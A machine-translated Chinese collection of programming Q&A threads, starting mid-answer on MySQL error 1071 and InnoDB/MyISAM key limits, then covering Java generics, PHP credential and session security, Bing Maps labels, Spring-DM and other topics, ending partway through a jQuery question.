> 当 CREATE TABLE 或 ALTER TABLE 等语句指定禁用或未编译的存储引擎时，控制默认存储引擎的自动替换。
> 
> 因为存储引擎可以在运行时插入，所以不可用的引擎以相同的方式处理：
> 
> 禁用 NO_ENGINE_SUBSTITUTION 后，对于 CREATE TABLE，使用默认引擎，如果所需引擎不可用，则会出现警告。对于 ALTER TABLE，会出现警告并且不会更改表。
> 
> 启用 NO_ENGINE_SUBSTITUTION 后，如果所需的引擎不可用，则会发生错误并且不会创建或更改表。

*   所以：如果 NO_ENGINE_SUBSTITUTION 被禁用并且 INNODB 被关闭，如果你在 CREATE TABLE 语句中指定 INNODB，MySql 也会切换到 MISAM。
*   如果您正在创建的表适用于 MISAM，您只会收到警告并创建表。那不是你的情况，你的创建语句包含一个超出MYISAM 1000字节限制的索引，然后创建失败，错误1071报告MYISAM错误。那是因为工作引擎是MYISAM，而不是INNODB。

## 证明

*MySql 5.1.56 社区版*

## 情况1：

```
Options in my.cnf  
sql-mode=""  
default-storage-engine=MYISAM  
skip-innodb uncommented (without#) 

Return on execution of your create statement:
Error Code: 1071\. Specified key was too long; max key length is 1000 bytes

Explanation: INNODB is not active, the engine is automatically switched to MYISAM  
that returns this error as they key is longer than MYISAM 1000 bytes limit.  
The key length is: 
2 fields x 255 char x 3 bytes utf8 encoding + 2 x 1 length byte = 1532 bytes 
```

## 案例二：

```
Options in my.cnf
sql-mode="NO_ENGINE_SUBSTITUTION"
default-storage-engine=MYISAM
skip-innodb uncommented (without#)

Return on execution of your create statement:
Error Code: 1286\. Unknown table engine 'INNODB'

Explanation: INNODB is not active but the engine substitution is not permitted
by sql mode therefore the DB returns an error about the attempt of using a disabled engine. 
```

## 案例3：

```
Options in my.cnf
sql-mode="NO_ENGINE_SUBSTITUTION"
default-storage-engine=MYISAM
skip-innodb commented (with#)

Return on execution of your create statement:
Table creation OK!

Explanation: INNODB is active (skip-innodb commented) and it is used also if      
the default engine is MYISAM. 
```

**为了重现测试，在 my.cnf 中的每次更改后重新启动 MySql。**

由于MySql 5.6版本的sqlmode默认不再为空并且包含NO_ENGINE_SUBSTITUTION，而且INNODB是默认引擎，所以这个错误很难遇到。

## 其他测试

没有其他方法可以重现错误：

```
Error Code: 1071\. Specified key was too long; max key length is 1000 bytes 
```

在尝试创建 INNODB 表时发现。

在 INNODB 中有两种 ERROR 1071：

```
Error Code: 1071\. Specified key was too long; max key length is 767 bytes 
```

这与 innodb_large_prefix ON 或 OFF 无关，而仅与用作索引的单个 VARCHAR 列的大小有关。

Mysql 将 varchar utf8 存储为 3 个字节加上 1 个字节，长度最多为 255 个字符，后面为 2 个（参见：[http](http://dev.mysql.com/doc/refman/5.7/en/storage-requirements.html) ://dev.mysql.com/doc/refman/5.7/en/storage-requirements.html ），所以如果你尝试使用 VARCHAR(256) utf8 设置密钥，您会得到：

```
256 x 3 + 2 = 770 bytes 
```

并且您会收到上一个错误，因为 InnoDB 表的单个列的最大键长度为 767 字节。一个 VARCHAR(255) 是可以的，因为：

```
255 x 3 + 1 = 766 bytes 
```

我在 Mysql 的 5.1.56、5.5.33、5.6 和 5.7 四个版本上对其进行了测试，并得到了证实。使用 VARCHAR(255) 查询没有问题，使用 VARCHAR(256) 有问题：

```
Error Code: 1071\. Specified key was too long; max key length is 767 bytes 
```

**如您所见，消息不同，因为它是 INNODB 消息而不是 MISAM 消息！**

INNODB 表的另一种类型的 ERROR 1071 是：

```
Error Code: 1071\. Specified key was too long; max key length is 3072 bytes 
```

这与具有多列的键有关。要启用这些键，您需要将 innodb_large_prefix 设置为 on。无论如何，如果你尝试运行这样的东西：

```
CREATE TABLE `phppos_modules_actions` (
  `action_id` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `module_id` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `action_name_key` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `action_name_key1` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `action_name_key2` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `sort` INT NOT NULL ,
  PRIMARY KEY ( `action_id` , `module_id`, `action_name_key`, `action_name_key1`, `action_name_key2` )
) ENGINE = INNODB CHARACTER SET utf8 COLLATE utf8_unicode_ci; 
```

使用 5 个 VARCHAR(255) utf8 列的键，即 3830 字节，您将遇到：

```
Error Code: 1071\. Specified key was too long; max key length is 3072 bytes 
```

## 外来假设

在寻找原因的过程中，我制定并测试了不同且非常奇怪的假设：

# 行格式

已测试 REDUNDANT、COMPACT、COMPRESS、DYNAMIC：对您的语句创建表没有影响。

# 文件格式

测试过的羚羊和梭子鱼：您的语句对表创建没有影响。

# MySql 构建

测试 32 位和 64 位 MySql：对您的语句创建表没有影响。

## 其他类似故障

在这里您可以在相同的情况下找到相同的错误：

[https://www.drupal.org/node/2466287](https://www.drupal.org/node/2466287)

我在证明中列出的 3 种测试情况下测试了该语句，它重现了与您完全相同的行为，所以我可以说问题是相同的。在那种情况下，他们切换到其他数据库，但问题是设置的混合，而不是数据库版本。

## 参考

这里给出了一篇非常好的使用 INNODB 进行索引的文章：

[http://mechanics.flite.com/blog/2014/07/29/using-innodb-large-prefix-to-avoid-error-1071/](http://mechanics.flite.com/blog/2014/07/29/using-innodb-large-prefix-to-avoid-error-1071/)

**警告：通过在创建索引超过 1000 的 INNODB 表后取消注释 my.cnf 中的 skip-innodb 来禁用 INNODB 将不允许启动 MySql 服务**

问候

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T17:00:50.940

我现在不知道你有多少灵活性，但这里有一些选择：

*   将 MySQL 版本升级到最新版本（我在 MySQL 5.5.25 上测试了代码，没有出现错误。）

*   从 utf8 更改为 latin1。

*   减小构成主键的字段的大小。创建一个单独的 auto_increment 主键字段来替换现有的键。`action_id` 在第一个字段（但不是第二个字段）上创建单独的索引

除了这些选项之外，您几乎被卡住了，因为在 MySQL 中没有可以更改的设置来启用大于 1000 字节的索引键。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-03-16T18:34:15.367

在 MySQL 5.6.3+ 中，有一些限制（需要和） `ROW_FORMAT=DYNAMIC`，您可以启用3072 字节的密钥长度限制。`innodb_file_format=BARRACUDA``innodb_file_per_table=true``innodb_large_prefix`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-03-22T00:22:56.903

你（不小心？）关闭了 InnoDB。它将表创建为 MyISAM，*整个*密钥超过 1000 个字节。

检查你是否有 InnoDB 的变量，以及是否有“no_engine_substitution”（如果在 5.1.56 中存在的话）还要检查`mysqld.err`它在启动时是否有一些相关的错误。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-03-16T18:13:38.570

它似乎与存储引擎有关。我的最终用户正在使用`MyISAM`它以不同方式处理数据存储，从而导致该错误。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-03-22T05:32:34.663

如前所述，索引的总长度太长。

简短的回答是无论如何您都不应该为这么长的`VARCHAR`列建立索引，因为索引会非常庞大​​且效率低下。

最佳做法是使用前缀索引，因此您只索引数据的左子字符串。无论如何，您的大部分数据都将比 255 个字符短得多。

767 字节是表的规定前缀限制`InnoDB`- 表的长度为 1,000 字节`MyISAM`。

根据对此问题的回复，您可以通过指定列的子集而不是整个金额来获取要应用的密钥。意味着您可以在定义索引时声明每列的前缀长度。

例如：

```
KEY `key_name` (`action_id`(50),`module_id`(50)) 
```

这是一个更清楚地解释它的示例：我创建了一个表并在其中插入了一些数据。

```
CREATE TABLE `phppos_modules_actions` (
  `action_id` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `module_id` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `action_name_key` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `sort` INT NOT NULL ,
  PRIMARY KEY ( `action_id`(50) , `module_id`(50) )
) ENGINE = INNODB CHARACTER SET utf8 COLLATE utf8_unicode_ci; 
```

但是给定列的最佳前缀长度是多少？下面是一种查找方法：

```
SELECT
 ROUND(SUM(LENGTH(`action_id`)<10)*100/COUNT(*),2) AS pct_length_10,
 ROUND(SUM(LENGTH(`action_id`)<20)*100/COUNT(*),2) AS pct_length_20,
 ROUND(SUM(LENGTH(`action_id`)<50)*100/COUNT(*),2) AS pct_length_50,
 ROUND(SUM(LENGTH(`action_id`)<100)*100/COUNT(*),2) AS pct_length_100
FROM `phppos_modules_actions`;

+---------------+---------------+---------------+----------------+
| pct_length_10 | pct_length_20 | pct_length_50 | pct_length_100 |
+---------------+---------------+---------------+----------------+
|         42.86 |         80.20 |        100    |         100    |
+---------------+---------------+---------------+----------------+ 
```

这告诉您 80% 的字符串少于 20 个字符，并且所有字符串少于 50 个字符。所以不需要索引超过 50 个前缀长度，当然也不需要索引 255 个字符的全长。

根据需要进行调整以获取应用密钥，但我想知道是否值得审查有关此实体的数据模型，以查看是否有改进可以让您在不达到 MySQL 限制的情况下实施预期的业务规则。

有关 innodb 设置的一些替代方法可以在[http://mechanics.flite.com/blog/2014/07/29/using-innodb-large-prefix-to-avoid-error-1071/找到](http://mechanics.flite.com/blog/2014/07/29/using-innodb-large-prefix-to-avoid-error-1071/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-03-17T21:50:37.647

## 官方文档 5.6

**InnoDB**表的限制

> InnoDB 内部最大密钥长度为 3500 字节，但 MySQL 本身将其限制为 3072 字节。此限制适用于多列索引中组合索引键的长度。

[http://dev.mysql.com/doc/refman/5.7/en/innodb-restrictions.html](http://dev.mysql.com/doc/refman/5.7/en/innodb-restrictions.html)

* * *

MyISAM**存储**引擎

> 最大密钥长度为 1000 字节。这也可以通过更改源并重新编译来更改。对于长度超过 250 字节的密钥，使用比默认值 1024 字节更大的密钥块大小。

[http://dev.mysql.com/doc/refman/5.7/en/myisam-storage-engine.html](http://dev.mysql.com/doc/refman/5.7/en/myisam-storage-engine.html)

* * *

但是，您的表被声明为 InnoDB。所以我不知道该怎么想

[这个老bug](https://bugs.mysql.com/bug.php?id=4541)的最后还有一个线索

> 如果您需要这个，您应该真正查看 MySQL 5.5 和从 5.5.14（2011 年 7 月）开始可用的 innodb_large_prefix 选项，因为它可能满足您的需求：
> 
> “启用此选项以允许索引键前缀超过 767 字节（最多 3072 字节），用于使用 DYNAMIC 和 COMPRESSED 行格式的 InnoDB 表。（创建此类表还需要选项值 innodb_file_format=barracuda 和 innodb_file_per_table=true。）有关各种设置下与索引键前缀关联的相关最大值，请参阅第 13.3.15 节，“InnoDB 表的限制”。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-03-20T12:16:41.747

最大密钥长度为 1000 字节。这也可以通过更改源并重新编译来更改。对于长度超过 250 字节的密钥，使用比默认值 1024 字节更大的密钥块大小。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-05-24T12:06:55.917

在我的例子中，MySQL 是在没有 InnoDB 支持的情况下启动的。在数据库备份导入期间 - 尝试创建 MyISAM 表。

同时，在 MySQL 重启过程中，控制台中没有显示错误。
只有在检查 MySQL 日志文件时 - 才发现这个。

顺便说一句，错误与 相关`innodb_log_file_size = 4G`，仅当将其更改为`innodb_log_file_size = 1G`- 启用 InnoDB 支持时。

# java - 获取通用数组类

> ID：11847817
> 
> 赞同：3
> 
> 时间：2012-08-07T14:08:58.873
> 
> 标签：java, arrays, generics

我有一个功能：

```
add(Collection<?> many) 
```

我这样称呼它：

```
Collection<NewClass> awa = new ArrayList<NewClass>();
add(awa) 
```

我如何获得`<?>`类型？在那个功能中？

`many.getClass()`给`ArrayList`.

为什么我需要这个？尝试创建一个通用的 DAO 方法来添加`< ? >`.

**编辑：**

像这样尝试：

```
public static void add(Collection<?> many)  {
    Type typeArg = ((ParameterizedType)Testing.class.getGenericSuperclass()).getActualTypeArguments()[0];
    System.out.println(typeArg);
}

    Collection<NewClass> awa = new ArrayList<NewClass>();

    add(awa); 
```

得到错误：

```
Exception in thread "main" java.lang.ClassCastException: java.lang.Class cannot be cast to java.lang.reflect.ParameterizedType 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T14:14:32.577

`many.getClass()`给`ArrayList`.

当然，这听起来是对的。

如果你这样做`many.get(0).getClass()`呢？在这里，如果有意义的话，我们正在询问元素，而不是容器。我是 C#er，所以这可能不是 100% 正确的方法，但这是我在 C# 中采用的路线。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:23:44.493

您可以解决此问题并使您的方法通用，例如：

```
public <T> void add(Collection<T> blah){} 
```

你可以打电话给它

```
this.<NewClass>add(awa); 
```

如果它在不同的班级，那么

```
DifferentClass dc = new DifferentClass();
dc.<NewClass>add(awa); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T14:46:06.940

您可以在运行时检查实际类型参数，但您只能通过反射 API 从字段、方法、构造函数等中读取。示例如下：

```
import java.lang.reflect.Field;
import java.lang.reflect.ParameterizedType;
import java.lang.reflect.Type;
import java.util.List;

public class TypesSample {

    public List<String> sampleList;

    public static void main(String[] args) throws Exception {
        Field f = TypesSample.class.getField("sampleList");
        ParameterizedType paramType = (ParameterizedType)f.getGenericType();
        Type typeArgument = paramType.getActualTypeArguments()[0];
        System.out.println(paramType.toString() + " with argument : " + typeArgument.toString());
    }

} 
```

它说 ：`java.util.List<java.lang.String> with argument : class java.lang.String`

由于类型擦除，您不会从对象引用中获取实际参数类型。

//编辑：

这是您可以针对您的情况做的事情：

```
abstract class GenericDAO<T> {

    public void add(Collection<T> many) {
        Type typeArg = ((ParameterizedType)this.getClass().getGenericSuperclass()).getActualTypeArguments()[0];
        System.out.println("This is a DAO for " + typeArg);
    }

}

    // create DAOs that define what type parameter is   
class IntegerDAO extends GenericDAO<Integer> {}
class StringDAO extends GenericDAO<String> {} 
```

接着 ：

```
GenericDAO<Integer> integerDAO = new IntegerDAO();
integerDAO.add(Arrays.asList(1,2,3));
GenericDAO<String> stringDAO = new StringDAO();
stringDAO.add(Arrays.asList("A","B","C")); 
```

说：这是类 java.lang.Integer 的 DAO 这是类 java.lang.String 的 DAO

但是您需要`T`通过扩展泛型类来明确声明什么是。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T14:29:54.277

为什么不尝试这样的事情：

```
public class Test {

  Test() {
    Collection<Integer> ints = new ArrayList<Integer>();
    add(ints, Integer.class);
    Collection<String> strings = new ArrayList<String>();
    add(strings, String.class);
  }

  public final <T> void add(Collection<T> many, Class<T> type) {
    System.out.println(type.getName());
    // do whatever needed.
  }

} 
```

# objective-c - 链接到 Quartz 框架或 ARC 错误？

> ID：11847824
> 
> 赞同：3
> 
> 时间：2012-08-07T14:09:12.997
> 
> 标签：objective-c, automatic-ref-counting, dynamic-linking

我有以下代码为 NSView 背景生成“噪声纹理”。

我已经在构建阶段将目标链接到`Cocoa`框架`QuartzCore`，但编译器一直抱怨以下错误：

> ARC语义问题
> 
> “类消息的接收器'CIFilter'是前向声明”
> 
> “选择器 filterWithName 的未知类方法”

```
CIFilter *randomGenerator = [CIFilter filterWithName:@"CIColorMonochrome"];

[randomGenerator setValue:[[CIFilter filterWithName:@"CIRandomGenerator"]           valueForKey:@"outputImage"]
                   forKey:@"inputImage"];

[randomGenerator setDefaults];
noisePattern = [randomGenerator valueForKey:@"outputImage"]; 
```

这里有什么问题？。我已经尝试了所有我能想象到的技巧，以摆脱错误。我确信这段代码可以工作，因为它是一个示例项目的副本，可以毫无问题地编译。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-07T14:13:07.833

但是，您将项目与 QuartzCore 框架链接，您仍然需要在实现文件中导入适当的标头：

```
#import <QuartzCore/QuartzCore.h> 
```

# svn - Subversion 提交挂钩多个项目存储库设置版本到具体项目

> ID：11847825
> 
> 赞同：1
> 
> 时间：2012-08-07T14:09:13.023
> 
> 标签：svn

在我们的存储库中有很多项目

```
存储库
    项目A
        树干
        分支机构
        标签
    项目B
        树干
        分支机构
        标签
    ...

```

现在我们必须向 projectA 添加修订号，并且只有在有人修改 projectA/trunk 的源代码而不是在其他情况下（编辑 ProjectB、分支等）时才需要更改

是否可以在一次提交中完成？（也许使用预提交挂钩？或其他方式？）或者是否可以从我们的主存储库创建具有历史记录的单独存储库？

我在看这里，我想如何做复杂的提交后挂钩，它将进行此编辑并发送带有更改版本的新提交。但我正在努力寻找更好的解决方案。

# android - 从服务调用 GCMRegistrar.getRegistrationId(this)

> ID：11847826
> 
> 赞同：0
> 
> 时间：2012-08-07T14:09:13.380
> 
> 标签：android

我需要从服务中获取设备谷歌消息注册 ID。但是，当我打电话时

```
GCMRegistrar.getRegistrationId(this) 
```

从服务中，它抱怨 GCMRegistrar.getRegistrationId(service) 不适用。

是否可以从服务中获取设备注册 ID。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:33:29.627

是的，但你必须以不同的方式来做。假设您的设备已经注册，您可以更改 Service 构造函数以将 Context 作为参数。这样，您的服务将有正确的应用程序上下文传递给 GCMRegistrar。如果您的服务已绑定，那么您始终可以使用 ContextWrapper 来获得相同的结果。

# php - PHP - 加密其他网站的用户名和密码

> ID：11847830
> 
> 赞同：7
> 
> 时间：2012-08-07T14:09:15.587
> 
> 标签：php, session, encryption, passwords

我正在编写一个允许用户注册的 PHP 站点，注册用户和未注册用户都可以为学校站点输入各自的用户名和密码（例如`smith8h4ft`- `j9hsbnuio`）。

然后，我的 PHP 脚本发送一些`$_POST`变量，下载并解析标记页面，创建一个名为: 的数组 `marksDB = Array("subject" => Array("A", "B", "A", "C"), ...)`，并将其重新格式化。

我的问题是： **我应该如何保证用户名和密码的安全？**

对于未注册的用户，我目前忘记了用户名和密码，`marksDB`并将`$_SESSION`. 当用户处于非活动状态例如 30 分钟时，marksDB 将被删除。这些数据的安全性如何`$_SESSION`？那些登录的用户，查看一次页面，然后再也没有查看过，所以脚本不会从会话中删除marksDB？会话是否自动删除（[gc.maxlifetime](http://www.php.net/manual/en/session.configuration.php#ini.session.gc-maxlifetime)）？

那么注册用户呢？我希望一切安全，但我不想每隔 30 分钟不活动就用密码提示来惹恼用户。像[这里](https://stackoverflow.com/questions/5089841/php-2-way-encryption-i-need-to-store-passwords-that-can-be-retrieved)描述的那样加密凭据是否安全，但没有第三个用户设置的密码？还是我每次都要向用户询问他的密码？

**编辑：**

感谢您的快速回复，
@Justin ᚅᚔᚈᚄᚒᚔ：我怀疑他们有一些 API，但我可以问他们，以防万一
@Abid Hussain：感谢非常有用的链接。（也感谢两位的回答）。
我会扔掉用户的凭据并且只解析`markDB`，我可能也会扔掉（在注销或不活动之后） - 在需要时再次检索标记很便宜。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:27:27.510

如果学校站点没有为此公开 API（例如，[像 StackExchange 站点那样使用 OAuth](https://api.stackexchange.com/docs/authentication)），那么您的选择将受到限制。

一般而言，**将用户的明文凭据保留超过绝对必要的时间绝不是一个好主意**。您可以想象到的任何可能的尝试方式（会话劫持、被盗密钥、解密等）都存在安全隐患。

更好的方法可能是使标记下载过程严格由用户启动。给他们一个按钮，上面写着“检索我的标记”，然后在那里完成身份验证过程，下载标记，然后扔掉他们的凭据。每次他们“同步”时，他们都应该进行身份验证。除非标记经常定期更改，否则没有理由不能一次下载所需的所有信息，然后将其安全地缓存在服务器上以供以后使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T15:15:35.203

见网址

[http://phpsec.org/projects/guide/4.html](http://phpsec.org/projects/guide/4.html)

[http://www.sitepoint.com/blogs/2004/03/03/notes-on-php-session-security/](http://www.sitepoint.com/blogs/2004/03/03/notes-on-php-session-security/)

[http://talks.php.net/show/phpworks2004-php-session-security](http://talks.php.net/show/phpworks2004-php-session-security)

[http://segfaultlabs.com/files/pdf/php-session-security.pdf](http://segfaultlabs.com/files/pdf/php-session-security.pdf)

[在 php 中创建会话的最安全方法](https://stackoverflow.com/questions/752332/safest-way-to-create-sessions-in-php)

**也读它**

会话比 cookie 安全得多。但是仍然有可能窃取会话，因此黑客可以完全访问该会话中的任何内容。避免这种情况的一些方法是 IP 检查（效果很好，但 fi 非常低，因此本身不可靠），以及使用随机数。通常使用 nonce，您有一个每页的“令牌”，以便每个页面检查最后一页的 nonce 是否与它存储的内容匹配。

在任一安全检查中，都会失去可用性。如果您进行 IP 检查并且用户位于 Intranet 防火墙（或导致此情况的任何其他情况）后面，该防火墙没有为该用户保留稳定的 IP，则他们每次丢失 IP 时都必须重新进行身份验证。使用随机数，您会得到“点击返回将导致此页面中断”的总是很有趣的情况。

但是使用 cookie，黑客可以通过使用相当简单的 XSS 技术来窃取会话。如果您将用户的会话 ID 存储为 cookie，他们也容易受到此攻击。因此，即使会话仅对可以进行服务器级黑客攻击的人来说是可渗透的（如果您的服务器是安全的，这需要更复杂的方法并且通常需要一定数量的权限），您仍然需要一些额外的验证级别根据每个脚本请求。您不应该同时使用 cookie 和 AJAX，因为如果该 cookie 被盗，这会使您更容易完全进入城镇，因为您的 ajax 请求可能不会对每个请求进行安全检查。例如，如果页面使用随机数，但从不重新加载页面，则脚本可能只检查该匹配。如果 cookie 持有认证方法，

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:20:44.957

会话文件将在一定时间后被垃圾收集器删除，但存储的一个好的经验法则`_SESSION`是只存储您将在屏幕上输出的数据，即密码可能不是您想要存储在会话中的东西。会话文件可以从服务器读取，一些恶意用户可能会劫持会话并看到他们不应该看到的东西，甚至以某种方式看到`var_dump($_SESSION)`.

如果您想允许注册用户更长的会话，您可以使用 JS 定期刷新页面（不一定刷新页面......只需一个异步请求即可），或者`ini_set`如果允许，甚至可以增加会话时间。反复询问密码不一定更安全..这取决于您询问时密码的脆弱程度*。*

另一个解决方案是让臭名昭著的“记住我”cookie 让用户保持登录状态。

密码不用于解密。加密保密。用于身份验证的哈希。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T14:35:56.393

会话中的所有内容都是服务器端的，因此其他人无法访问。但是，会话可能会被“劫持”，如此[处](http://phpsec.org/projects/guide/4.html)所述。

您可以在 PHP.ini 中增加会话的长度，或者在后台使用定期 AJAX 调用来保持会话处于活动状态。会话在服务器过期时被删除。

除非别无选择，否则通常不赞成对密码进行加密以便对其进行解密。通过加密，不仅您，而且其他有权访问您的数据库和/或源代码的人都可以检索密码。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-07T14:17:47.910

会话文件是服务器端的，因此它应该对客户端不可见。但是如果他们知道会话 ID，他们仍然可以欺骗您的程序使用另一个会话。

对于注册用户，您可以在使用只有您知道的密钥对其进行加密后将密码存储在数据库或文件中（可能是随机生成并为每个用户存储的新密码）

# bing-maps - Bing Maps v7 在地图上写字

> ID：11847834
> 
> 赞同：1
> 
> 时间：2012-08-07T14:09:28.173
> 
> 标签：bing-maps

我正在开发一种产品，该产品将显示有关威斯康星州各个县的信息。是否可以以编程方式在地图上写下县名？我见过的唯一选择是创建一个平铺层。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-01T12:22:44.177

我在这里写了一篇关于如何实现这一点的博客文章：[http ://rbrundrit.wordpress.com/2012/03/31/label-pushpins-in-bing-maps-v7/](http://rbrundritt.wordpress.com/2012/03/31/label-pushpins-in-bing-maps-v7/)

这是代码示例：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
   <head>
      <title></title>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
      <script type="text/javascript" src="http://ecn.dev.virtualearth.net/mapcontrol/mapcontrol.ashx?v=7.0"></script>

      <script type="text/javascript">
         var map = null;         

         function GetMap()
         {
            // Initialize the map
            map = new Microsoft.Maps.Map(document.getElementById("myMap"),
                  {
                    credentials:"YOUR_BING_MAPS_KEY"
                  }); 

            var labelPin = new Microsoft.Maps.Pushpin(new Microsoft.Maps.Location(0,0),{
                text : 'Custom Label',    //The text for the label
                typeName : 'labelPin',     //Assign a CSS class to the pin
                anchor : new Microsoft.Maps.Point(0,0),  //Reset the anchor point of the pin to make aligning the text easier.
                textOffset : new Microsoft.Maps.Point(-45,0) //Adjust textOffset point for better label positioning
                //Adjust the x value as you see fit for better centering of text
            });

            map.entities.push(labelPin);
         } 
      </script>
      <style>
      /* Allow div of pushpin to display overflowing content */
      .labelPin{
        overflow:visible !important;
      }

      /* Hide the default pushpin, Alternatively point the icon property of the pushpin to a transparent image */
      .labelPin img{
        display:none;
      }

      /*Use this to style the text*/
      .labelPin div{
        white-space:nowrap;
        color:blue !important;
      }
      </style>
   </head>
   <body onload="GetMap();">
    <div id='myMap' style="position:relative; width:800px; height:600px;"></div>
   </body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T05:57:57.523

只需使用带有自定义图像的图钉，并将自定义图像设置为透明图像，因此您看到的只是图钉文本。为方便起见，您甚至可以直接内联指定 base64 编码的透明图像，如下所示：

```
var pushpinOptions = {
    icon: "data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==",/* Transparent 1px x 1px gif with a 1bit palette, created with gimp and encoded with base64 tool in linux.*/
    text: 'Your county name goes here',
    draggable: false,
    visible: true,
};
var pushpin = new Microsoft.Maps.Pushpin(new Microsoft.Maps.Location(47.6, - 122.33), pushpinOptions); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:20:41.033

我不确定您在后端使用什么，但我将通过执行以下操作来完成此操作：

ajax 回调服务器，获取返回以下或类似内容的对象 {CountyName = 'Iron', latitude = '23', longitude = -100}

在回调中迭代并填充自定义信息框。

# html - Outlook 2007 - 编辑 html？

> ID：11847836
> 
> 赞同：0
> 
> 时间：2012-08-07T14:09:32.463
> 
> 标签：html, outlook-2007

我有outlook 2007，想编辑它的html。我在选项下看到 HTML 已设置，然后作为我输入的正文`<b>test</b>`，当我发送和接收时，它看起来仍然像`<b>test</b>`而不是**测试**。我需要它是大胆的。（我知道有一个让它变粗的选项，但我想找到正确的方法，这样我就可以把它应用到其他事情上）

我也尝试导出为 html，然后更改其中的 html，但我不知道如何再次在 Outlook 中打开它。

有人知道吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-23T15:09:06.467

有一个附加工具可以直接在 Outlook 2010 上编辑 HTML。在 2007 年，有一个调整可以编辑它。请参阅[https://superuser.com/questions/536275/how-can-i-edit-the-html-source-code-of-an-email-in-outlook-2010-without-any-add](https://superuser.com/questions/536275/how-can-i-edit-the-html-source-code-of-an-email-in-outlook-2010-without-any-add)

# java - 使用 Spring-DM 扩展器

> ID：11847843
> 
> 赞同：0
> 
> 时间：2012-08-07T14:09:57.113
> 
> 标签：java, spring, eclipse-virgo, spring-dm, osgi-fragment

我需要等待一段时间才能关闭我的 OSGI 上下文。（给一些时间来完成当前正在运行的任务）。我遇到了bean`shutdown.wait.time`中的属性。`extenderProperties`

谁能告诉我如何使用这个 OSGi 片段来实现我的目标？我想我可以将片段包附加到我现有的 OSGI 包中。

提前致谢。感谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-10T22:56:44.930

您需要创建一个包含两个文件的包：META-INF/MANIFEST.MF 和 META-INF/spring/extender/extender.xml（xml 文件可以命名为任何具有 xml 扩展名的文件，但必须在META-INF/spring/extender 文件夹）。您的 MANIFEST.MF 文件将需要包含**org.springframework.osgi.extender**的OSGi 清单标头**Fragment-Host**。如果您使用的是 maven-bundle-plugin，您的插件配置将如下所示：

 **```
...
<plugin>
  <groupId>org.apache.felix</groupId>
  <artifactId>maven-bundle-plugin</artifactId>
  <version>2.3.5</version>
  <extensions>true</extensions>
  <configuration>
    <instructions>
      <Fragment-Host>org.springframework.osgi.extender</Fragment-Host>
    </instructions>
  </configuration>
</plugin>
... 
```

您的 extender.xml 文件将需要定义一个名为**extenderProperties的****java.util.Properties** bean 。它应该包含一个名为 shutdown.wait.time 的属性，其值以毫秒为单位（例如，30000 表示 30 秒）。该文件可能如下所示：

 **```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:context="http://www.springframework.org/schema/context"
  xmlns:util="http://www.springframework.org/schema/util"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
  xsi:schemaLocation="
    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    http://www.springframework.org/schema/context     http://www.springframework.org/schema/context/spring-context-3.0.xsd
http://www.springframework.org/schema/util     http://www.springframework.org/schema/util/spring-util-3.0.xsd">
  <util:properties id="extenderProperties">
    <prop key="shutdown.wait.time">30000</prop>
  </util:properties>
</beans> 
```

然后将捆绑包部署到您的环境中。您可能需要重新启动 Spring OSGi 捆绑包（或您的服务器），具体取决于此片段捆绑包相对于 Spring DM 捆绑包的安装顺序。****

# jquery - 谁能告诉我为什么这个 Jquery 不起作用？

> ID：11847846
> 
> 赞同：0
> 
> 时间：2012-08-07T14:10:09.780
> 
> 标签：jquery

我编写了一个 jQuery 函数，用于具有 5 个级别的树视图，您可以单击查看下一个级别的数据，我正在处理的上一个级别似乎根本没有工作。在我看来，甚至没有调用 jQuery，因为如果它是我的控制器，它通常至少会打开没有数据的树一秒钟。下面我发布了我现在正在处理的级别的 jQuery 以及它上面的所有级别以供分析。任何建议或帮助将不胜感激！如果您也需要控制器，请告诉我。

